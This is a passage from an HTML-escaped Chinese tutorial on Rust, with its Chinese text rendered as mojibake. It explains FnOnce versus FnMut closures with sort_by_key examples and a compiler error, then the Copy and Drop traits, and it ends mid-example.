&lt;/div>&lt;p>å¦‚æœä½ ä¼ å…¥ä¸€ä¸ªä»…å®ç° &lt;code>FnOnce&lt;/code> çš„é—­åŒ…ï¼Œåˆ™ä¼šç¼–è¯‘å¤±è´¥ï¼Œä¾‹å¦‚ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-rust" data-lang="rust">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#[derive(Debug)]&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="nc">Rectangle&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">width&lt;/span>: &lt;span class="kt">u32&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">height&lt;/span>: &lt;span class="kt">u32&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">fn&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">mut&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">list&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">Rectangle&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">width&lt;/span>: &lt;span class="mi">10&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">height&lt;/span>: &lt;span class="mi">1&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">},&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">Rectangle&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">width&lt;/span>: &lt;span class="mi">3&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">height&lt;/span>: &lt;span class="mi">5&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">},&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">Rectangle&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">width&lt;/span>: &lt;span class="mi">7&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">height&lt;/span>: &lt;span class="mi">12&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">},&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">];&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">mut&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">sort_operations&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="fm">vec!&lt;/span>&lt;span class="p">[];&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">value&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nb">String&lt;/span>::&lt;span class="n">from&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;by key called&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">list&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">sort_by_key&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="n">r&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">sort_operations&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">push&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">value&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c1">// value è¢« move out äº†ï¼Œç¼–è¯‘å¤±è´¥â—
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">r&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">width&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">});&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="fm">println!&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="si">{:#?}&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">list&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>ç¼–è¯‘å™¨æŠ¥å‘Šçš„é”™è¯¯å¦‚ä¸‹ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-text" data-lang="text">&lt;span class="line">&lt;span class="cl">error[E0507]: cannot move out of `value`, a captured variable in an `FnMut` closure
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> --&amp;gt; src/main.rs:19:30
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> |
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">16 | let value = String::from(&amp;#34;by key called&amp;#34;);
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> | ----- captured outer variable
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">17 |
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">18 | list.sort_by_key(|r| {
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> | --- captured by this `FnMut` closure
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">19 | sort_operations.push(value); // value è¢« move out äº†ï¼Œç¼–è¯‘å¤±è´¥â—
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> | ^^^^^ move occurs because `value` has type `String`, which does not implement the `Copy` trait
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">For more information about this error, try `rustc --explain E0507`.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">error: could not compile `cargoUnHfvy` (bin &amp;#34;cargoUnHfvy&amp;#34;) due to previous error
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>ç”±äºè¯¥é—­åŒ…å°† &lt;code>value&lt;/code> move åˆ°é—­åŒ…å¤–éƒ¨ï¼Œè¯¥é—­åŒ…ä»…å®ç°äº† &lt;code>FnOnce&lt;/code> trait (åªèƒ½è¢«è°ƒç”¨ä¸€æ¬¡),
å› æ­¤ä¸ç¬¦åˆ &lt;code>FnMut&lt;/code> çš„è§„èŒƒã€‚&lt;/p>
&lt;p>ç›¸åï¼Œä¸‹é¢çš„ä¾‹å­æ˜¯åˆæ³•çš„ï¼Œå› ä¸ºè¯¥é—­åŒ…ä»…æ•è·äº† mutable å¼•ç”¨ï¼Œæ²¡æœ‰å¯¹æ•è·çš„å˜é‡è¿›è¡Œ
&lt;code>move&lt;/code> æ“ä½œï¼Œå› æ­¤ç¬¦åˆ &lt;code>FnMut&lt;/code> çš„è§„èŒƒï¼ˆå¯ä»¥è¢«å¤šæ¬¡è°ƒç”¨ï¼‰ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-rust" data-lang="rust">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#[derive(Debug)]&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="nc">Rectangle&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">width&lt;/span>: &lt;span class="kt">u32&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">height&lt;/span>: &lt;span class="kt">u32&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">fn&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">mut&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">list&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">Rectangle&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">width&lt;/span>: &lt;span class="mi">10&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">height&lt;/span>: &lt;span class="mi">1&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">},&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">Rectangle&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">width&lt;/span>: &lt;span class="mi">3&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">height&lt;/span>: &lt;span class="mi">5&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">},&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">Rectangle&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">width&lt;/span>: &lt;span class="mi">7&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">height&lt;/span>: &lt;span class="mi">12&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">},&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">];&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">mut&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">num_sort_operations&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">list&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">sort_by_key&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="n">r&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">num_sort_operations&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">+=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">r&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">width&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">});&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="fm">println!&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="si">{:#?}&lt;/span>&lt;span class="s">, sorted in &lt;/span>&lt;span class="si">{num_sort_operations}&lt;/span>&lt;span class="s"> operations&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">list&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-text" data-lang="text">&lt;span class="line">&lt;span class="cl">[
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Rectangle {
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> width: 3,
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> height: 5,
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> },
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Rectangle {
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> width: 7,
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> height: 12,
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> },
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Rectangle {
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> width: 10,
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> height: 1,
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> },
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">], sorted in 6 operations
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="trait-å’Œæ‰€æœ‰æƒ--ownership">Trait å’Œæ‰€æœ‰æƒ (Ownership)&lt;/h2>
&lt;p>Rust åœ¨å¤„ç† &lt;em>ownership&lt;/em> è§„åˆ™æ—¶ï¼Œä¼šæ ¹æ®ç±»å‹æ˜¯å¦å®ç°äº† &lt;code>Copy&lt;/code> trait æ¥åŒºåˆ«å¯¹å¾…ã€‚å…·ä½“è€Œè¨€ï¼š&lt;/p>
&lt;ul>
&lt;li>å®ç°äº† &lt;code>Copy&lt;/code> trait çš„ç±»å‹ï¼Œå…¶å€¼å¯ä»¥è¢«å­˜å‚¨åœ¨æ ˆä¸Šã€‚&lt;/li>
&lt;li>å®ç°äº† &lt;code>Copy&lt;/code> trait çš„ç±»å‹ï¼Œåœ¨èµ‹å€¼å’Œä¼ å‚æ—¶ï¼Œä¸ä¼šå‘ç”Ÿ &lt;code>move&lt;/code>, è€Œæ˜¯ç›´æ¥æ‹·è´ã€‚&lt;/li>
&lt;li>&lt;strong>æœªå®ç°&lt;/strong> &lt;code>Copy&lt;/code> trait çš„ç±»å‹ï¼Œåœ¨èµ‹å€¼å’Œä¼ å‚æ—¶ï¼Œä¼šå‘ç”Ÿ &lt;code>move&lt;/code>, ä¹‹åä¸å†æœ‰æ•ˆã€‚&lt;/li>
&lt;li>å®ç°äº† &lt;code>Drop&lt;/code> trait çš„ç±»å‹ï¼Œåœ¨å…¶ owner è¶…å‡ºä½œç”¨åŸŸèŒƒå›´æ—¶ï¼Œä¼šè°ƒç”¨å…¶ &lt;code>drop&lt;/code> æ–¹æ³•ã€‚&lt;/li>
&lt;/ul>
&lt;blockquote>
&lt;p>ğŸ’¡ å¦‚æœä¸€ä¸ªç±»å‹ï¼ˆæˆ–è€…è¯¥ç±»å‹çš„ä¸€éƒ¨åˆ†ï¼‰å®ç°äº† &lt;code>Drop&lt;/code> trait, åˆ™ä¸èƒ½å®ç° &lt;code>Copy&lt;/code> traitã€‚è¿™äºŒè€…æ˜¯äº’æ–¥çš„ï¼Œå¦‚æœåŒæ—¶å­˜åœ¨ï¼Œä¼šå¯¼è‡´ç¼–è¯‘é”™è¯¯ã€‚&lt;/p>
&lt;/blockquote>
&lt;h3 id="copy-trait">&lt;code>Copy&lt;/code> trait&lt;/h3>
&lt;p>å­˜å‚¨åœ¨ stack ä¸Šçš„æ•°æ®æ‹·è´é€Ÿåº¦å¾ˆå¿«ï¼Œè€Œä¸”æ·±æ‹·è´å’Œæµ…æ‹·è´æ²¡æœ‰ä»»ä½•åŒºåˆ«ï¼Œå› æ­¤å¯ä»¥ç›´æ¥é‡‡ç”¨ copy çš„æ–¹å¼å¤„ç†ã€‚Rust é€šè¿‡ &lt;code>Copy&lt;/code> trait æ¥æ ‡è¯†è¿™ç±»æ•°æ®ã€‚&lt;/p>
&lt;p>ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸è§çš„å®ç°äº† &lt;code>Copy&lt;/code> trait çš„ç±»å‹ï¼š&lt;/p>
&lt;ul>
&lt;li>&lt;a href="https://doc.rust-lang.org/book/ch03-02-data-types.html#scalar-types">æ ‡é‡ç±»å‹ï¼ˆScalar typesï¼‰&lt;/a>ç”±äº size å›ºå®šï¼Œå¯ä»¥ç›´æ¥å­˜å‚¨åœ¨æ ˆä¸Šã€‚&lt;/li>
&lt;li>å…ƒç»„ï¼ˆTupleï¼‰å¦‚æœåªåŒ…å«å®ç°äº† &lt;code>Copy&lt;/code> trait çš„ç±»å‹ï¼Œåˆ™ä¹Ÿè¢«è§†ä¸ºå®ç°äº† &lt;code>Copy&lt;/code> traitã€‚
&lt;ul>
&lt;li>ä¾‹å¦‚ &lt;code>(i32, i32)&lt;/code> å®ç°äº† &lt;code>Copy&lt;/code>, ä½† &lt;code>(i32, String)&lt;/code> åˆ™æœªå®ç°ã€‚&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="drop-trait">&lt;code>Drop&lt;/code> trait&lt;/h3>
&lt;p>å­˜å‚¨åœ¨ heap ä¸Šçš„æ•°æ®ä¸€èˆ¬ size ä¸ç¡®å®šï¼Œä¸”æ‹·è´æˆæœ¬è¾ƒé«˜ï¼Œå› æ­¤é‡‡ç”¨ &lt;em>move&lt;/em> çš„æ–¹å¼å¤„ç†ã€‚&lt;/p>
&lt;p>è¿™ç±»æ•°æ®åœ¨è¶…å‡ºä½œç”¨åŸŸèŒƒå›´æ—¶ï¼Œå¾€å¾€éœ€è¦åšä¸€äº›ç‰¹æ®Šå¤„ç†ä»¥ä¾¿å›æ”¶å†…å­˜æˆ–é‡Šæ”¾èµ„æºï¼Œå› æ­¤éœ€è¦å®ç° &lt;code>Drop&lt;/code> traitã€‚&lt;/p>
&lt;p>é’ˆå¯¹è¿™ç±»å‹æ•°æ®ï¼Œå¦‚æœåœ¨æŸäº›åœºåˆç¡®å®éœ€è¦è¿›è¡Œâ€œæ·±æ‹·è´â€æ“ä½œï¼Œå¯ä»¥é€šè¿‡æ˜¾å¼è°ƒç”¨å¯¹è±¡çš„
&lt;code>clone()&lt;/code> æ–¹æ³•æ‰‹åŠ¨è¿›è¡Œæ·±æ‹·è´ã€‚&lt;/p>
&lt;p>å®ç°äº† &lt;code>Drop&lt;/code> trait çš„ç±»å‹ç¤ºä¾‹ï¼š&lt;/p>
&lt;ul>
&lt;li>&lt;code>Box&lt;/code>&lt;/li>
&lt;li>&lt;code>Vec&lt;/code>&lt;/li>
&lt;li>&lt;code>String&lt;/code>&lt;/li>
&lt;li>&lt;code>File&lt;/code>&lt;/li>
&lt;li>&lt;code>Process&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>&lt;code>Drop&lt;/code> trait ä½¿ç”¨ç¤ºä¾‹ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-rust" data-lang="rust">&lt;span class="line">&lt;span class="cl">&lt;span class="k">struct&lt;/span> &lt;span class="nc">Droppable&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">name&lt;/span>: &lt;span class="kp">&amp;amp;&lt;/span>&lt;span class="nb">&amp;#39;static&lt;/span> &lt;span class="kt">str&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w">
